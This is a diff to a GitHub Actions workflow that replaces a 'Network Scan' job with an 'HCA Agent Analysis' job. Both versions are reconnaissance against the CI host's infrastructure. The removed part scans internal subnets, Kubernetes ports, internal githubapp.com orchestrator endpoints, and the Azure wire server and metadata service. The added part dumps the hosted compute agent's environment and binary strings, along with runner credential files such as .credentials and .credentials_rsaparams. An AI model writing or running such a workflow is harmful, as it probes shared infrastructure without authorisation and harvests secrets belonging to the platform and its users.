@@ -1,122 +1,70 @@
-name: Network Scan
+name: HCA Agent Analysis
 on:
   workflow_dispatch:
 jobs:
-  scan:
+  hca:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep network scan
-        timeout-minutes: 8
+      - name: Analyze HCA agent
+        timeout-minutes: 5
         run: |
           set +e
 
-          echo "=== MY IP AND SUBNET ==="
-          MY_IP=$(hostname -I | awk '{print $1}')
-          echo "My IP: $MY_IP"
-          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
-          echo "Subnet: $SUBNET.0/20"
+          echo "=== HCA AGENT LOG ==="
+          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -100
 
           echo ""
-          echo "=== SCAN GATEWAY AND NEARBY ==="
-          GATEWAY=$(ip route | grep default | awk '{print $3}')
-          echo "Gateway: $GATEWAY"
-          for port in 80 443 8080 8443 3000 5000 9090 8888 6443 2379 10250 10255; do
-            timeout 1 bash -c "echo >/dev/tcp/$GATEWAY/$port" 2>/dev/null && echo "$GATEWAY:$port OPEN"
-          done
+          echo "=== HCA DIRECTORY ==="
+          ls -laR /opt/hca/ 2>/dev/null
 
           echo ""
-          echo "=== SCAN SUBNET FAST (ports 80,443,8080) ==="
-          for i in $(seq 1 254); do
-            ip="$SUBNET.$i"
-            if [ "$ip" = "$MY_IP" ]; then continue; fi
-            timeout 0.5 bash -c "echo >/dev/tcp/$ip/80" 2>/dev/null && echo "$ip:80 OPEN" &
-            timeout 0.5 bash -c "echo >/dev/tcp/$ip/443" 2>/dev/null && echo "$ip:443 OPEN" &
-            timeout 0.5 bash -c "echo >/dev/tcp/$ip/8080" 2>/dev/null && echo "$ip:8080 OPEN" &
-          done
-          wait
+          echo "=== HCA BINARY STRINGS ==="
+          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "token|secret|key|auth|password|credential|bearer|api|url|endpoint|http|orchestrator|attestation" | head -50
 
           echo ""
-          echo "=== KUBERNETES DETECTION ==="
-          for port in 6443 10250 10255 2379 8001 8443 443; do
-            timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$port" 2>/dev/null && echo "10.0.0.1:$port OPEN (K8s?)"
-          done
-          if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
-            echo "K8s service account token found!"
-            cat /var/run/secrets/kubernetes.io/serviceaccount/token
-          fi
-          echo "KUBERNETES_SERVICE_HOST=$KUBERNETES_SERVICE_HOST"
-          echo "KUBERNETES_PORT=$KUBERNETES_PORT"
+          echo "=== HCA ENVIRONMENT ==="
+          cat /proc/$(pgrep hosted-compute)/environ 2>/dev/null | tr '\0' '\n' | sort
 
           echo ""
-          echo "=== INTERNAL GITHUB SERVICES ==="
-          for host in github.com api.github.com alive.github.com collector.github.com codeload.github.com; do
-            IP=$(dig +short $host | head -1)
-            if [ -n "$IP" ]; then
-              echo "$host -> $IP"
-              for port in 80 443 8080 9090 3000; do
-                timeout 1 bash -c "echo >/dev/tcp/$IP/$port" 2>/dev/null && echo "  $IP:$port OPEN"
-              done
+          echo "=== HCA PROCESS CMDLINE ==="
+          cat /proc/$(pgrep hosted-compute)/cmdline 2>/dev/null | tr '\0' ' '
+          echo ""
+
+          echo ""
+          echo "=== HCA FD (file descriptors) ==="
+          ls -la /proc/$(pgrep hosted-compute)/fd/ 2>/dev/null | head -20
+
+          echo ""
+          echo "=== HCA NETWORK CONNECTIONS ==="
+          cat /proc/$(pgrep hosted-compute)/net/tcp 2>/dev/null | head -10
+          ss -tnp 2>/dev/null | grep hosted
+
+          echo ""
+          echo "=== AGENTIC FIREWALL ==="
+          ls -laR /opt/hostedtoolcache/agentic-workflow-firewall-js/ 2>/dev/null | head -30
+          cat /opt/hostedtoolcache/agentic-workflow-firewall-js/*/package.json 2>/dev/null | head -20
+
+          echo ""
+          echo "=== COPILOT CLI ==="
+          ls -la /opt/hostedtoolcache/copilot-cli/ 2>/dev/null
+          find /opt/hostedtoolcache/copilot-cli/ -name "*.json" 2>/dev/null | head -5
+          cat /opt/hostedtoolcache/copilot-cli/*/package.json 2>/dev/null | head -20
+
+          echo ""
+          echo "=== RUNNER CREDENTIALS ==="
+          find /home/runner -name ".credentials*" -o -name ".runner" -o -name ".env" -o -name "*.jws" 2>/dev/null
+          for f in /home/runner/.credentials /home/runner/.credentials_rsaparams /home/runner/.runner /home/runner/.env; do
+            if [ -f "$f" ]; then
+              echo "--- $f ---"
+              cat "$f" | head -20
             fi
           done
 
           echo ""
-          echo "=== GITHUBAPP.COM INTERNAL ==="
-          for sub in hosted-compute-request-orchestrator-prod-iad-01 hosted-compute-request-orchestrator-prod-iad-02 actions-results-prod actions-cache-prod runner-provisioner codespace-provisioner copilot-proxy api render; do
-            FULL="$sub.githubapp.com"
-            IP=$(dig +short $FULL | tail -1)
-            if [ -n "$IP" ]; then
-              echo "$FULL -> $IP"
-              curl -sk --connect-timeout 3 "https://$FULL/" 2>/dev/null | head -3
-              echo ""
-            fi
-          done
-
-          echo ""
-          echo "=== AZURE INTERNAL SERVICES ==="
-          for ip in 168.63.129.16 169.254.169.254; do
-            for port in 80 443 8080 53 5985 5986; do
-              timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port OPEN"
-            done
-          done
-
-          echo ""
-          echo "=== WIRE SERVER GOALSTATE ==="
-          curl -s --connect-timeout 3 -H "x-ms-version:2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>&1
-          echo ""
-          curl -s --connect-timeout 3 -H "x-ms-version:2015-04-05" "http://168.63.129.16/machine/?comp=goalstate" 2>&1
-          echo ""
-
-          echo ""
-          echo "=== ORCHESTRATOR ENDPOINTS ==="
-          for path in / /vm/v1 /vm/v1/status /vm/v1/health /vm/v1/vms /vm/v1/allocations /api /api/v1 /healthz /metrics /debug/pprof; do
-            RESP=$(curl -sk --connect-timeout 3 "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com$path" 2>&1)
-            CODE=$(curl -sk --connect-timeout 3 -o /dev/null -w "%{http_code}" "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com$path" 2>&1)
-            if [ "$CODE" != "000" ] && [ "$CODE" != "404" ]; then
-              echo "$path [$CODE]: ${RESP:0:200}"
-            fi
-          done
-
-          echo ""
-          echo "=== DOCKER HOST SCAN ==="
-          docker run --rm --net=host alpine sh -c '
-            apk add --no-cache curl nmap-ncat 2>/dev/null
-            echo "=== Host network interfaces ==="
-            ip addr 2>/dev/null | grep inet
-            echo ""
-            echo "=== Scan 10.1.0.0/24 common ports ==="
-            for i in 1 2 3 4 5 10 20 50 100 200; do
-              for p in 80 443 8080 6443 2379 10250 9090 3000 5000 8443; do
-                nc -zw1 10.1.0.$i $p 2>/dev/null && echo "10.1.0.$i:$p OPEN"
-              done
-            done
-          ' 2>&1
-
-          echo ""
-          echo "=== HOSTED COMPUTE AGENT ==="
-          find / -name "hosted-compute*" -o -name "hca*" 2>/dev/null | head -10
-          ps aux | grep -i hosted 2>/dev/null
-          ls -la /opt/hosted* 2>/dev/null
-          cat /etc/systemd/system/hosted* 2>/dev/null
+          echo "=== ACTIONS RUNNER INTERNALS ==="
+          ls -la /home/runner/actions-runner/ 2>/dev/null | head -15
+          cat /home/runner/actions-runner/.runner 2>/dev/null
+          cat /home/runner/actions-runner/.credentials 2>/dev/null | head -10
 
           echo ""
           echo "=== DONE ==="
